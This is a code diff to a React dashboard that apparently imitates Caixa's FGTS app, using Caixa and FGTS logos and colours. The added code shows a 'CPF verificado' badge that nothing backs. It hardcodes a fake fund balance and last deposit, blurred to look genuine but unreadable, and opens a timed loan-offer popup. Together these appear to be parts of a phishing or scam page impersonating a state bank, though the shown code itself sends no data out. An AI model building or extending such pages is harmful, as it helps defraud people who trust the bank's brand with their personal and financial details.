@@ -3,6 +3,8 @@ import React, { useEffect, useState } from 'react';
 import { ArrowRight, DollarSign, BarChart3, Calendar, Home, HelpCircle, MoreHorizontal } from 'lucide-react';
 import CaixaLogo from '@/components/CaixaLogo';
 import FGTSLogo from '@/components/FGTSLogo';
+import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog";
+import { Button } from '@/components/ui/button';
 
 interface UserData {
   DADOS: {
@@ -16,7 +18,8 @@ interface UserData {
 
 const Dashboard = () => {
   const [fullName, setFullName] = useState('');
-
+  const [showPopup, setShowPopup] = useState(false);
+  
   useEffect(() => {
     try {
       // Try to get user data from localStorage
@@ -56,11 +59,25 @@ const Dashboard = () => {
         
         simulateApiCall();
       }
+      
+      // Set timeout for popup to appear after 5 seconds
+      const popupTimer = setTimeout(() => {
+        setShowPopup(true);
+      }, 5000);
+      
+      return () => clearTimeout(popupTimer);
     } catch (error) {
       console.error("Error processing user data:", error);
       setFullName("Usuário");
     }
   }, []);
+
+  // Function to blur text (style it to look unreadable)
+  const BlurredText = ({ children, className = "" }: { children: React.ReactNode, className?: string }) => (
+    <span className={`text-transparent bg-gray-300 rounded-sm blur-[1.5px] select-none ${className}`}>
+      {children}
+    </span>
+  );
 
   return (
     <div className="min-h-screen flex flex-col bg-gradient-to-r from-[#008792] to-[#005CA9]">
@@ -74,6 +91,7 @@ const Dashboard = () => {
       <div className="p-6">
         <div className="text-white text-2xl font-light">Olá</div>
         <div className="text-white opacity-60 text-lg">{fullName}</div>
+        <div className="text-white opacity-60 text-xs mt-1">CPF verificado</div>
       </div>
 
       {/* Main content */}
@@ -84,7 +102,8 @@ const Dashboard = () => {
             <h2 className="text-[#005CA9] text-2xl font-bold mb-2">Meu FGTS</h2>
             <div className="flex justify-between items-center">
               <div>
-                <span className="text-gray-500">R$</span>
+                <span className="text-gray-500">R$ </span>
+                <BlurredText className="text-lg font-bold">5.900,00</BlurredText>
               </div>
               <ArrowRight className="text-[#FF8C00]" />
             </div>
@@ -113,7 +132,9 @@ const Dashboard = () => {
             <div className="bg-gray-100 rounded-lg p-4">
               <div className="text-gray-500 text-sm">O último</div>
               <div className="text-gray-500 text-sm">depósito foi de</div>
-              <div className="font-bold text-lg">R$</div>
+              <div className="font-bold text-lg">
+                R$ <BlurredText>189,89</BlurredText>
+              </div>
               <div className="text-[#FF8C00] text-xs mt-2">referente a 07/11/2022</div>
             </div>
 
@@ -184,6 +205,30 @@ const Dashboard = () => {
           </div>
         </div>
       </div>
+
+      {/* Loan Popup */}
+      <Dialog open={showPopup} onOpenChange={setShowPopup}>
+        <DialogContent className="max-w-[350px] rounded-lg px-4 py-4 bg-white">
+          <div className="flex flex-col items-start space-y-3">
+            <span className="text-[#005CA9] text-2xl font-semibold">Crédito do Trabalhador</span>
+            
+            <div className="text-gray-600 text-sm mt-2">
+              Faça simulações de empréstimo e solicite propostas de empréstimos para as instituições financeiras parceiras.
+            </div>
+            
+            <Button 
+              className="w-full mt-4 bg-[#005CA9] hover:bg-[#004A87] text-white px-6 py-2 rounded-full"
+              onClick={() => setShowPopup(false)}
+            >
+              IR PARA EMPRÉSTIMOS
+            </Button>
+            
+            <div className="w-full flex justify-center mt-2">
+              <div className="w-2 h-2 rounded-full bg-[#005CA9]"></div>
+            </div>
+          </div>
+        </DialogContent>
+      </Dialog>
     </div>
   );
 };
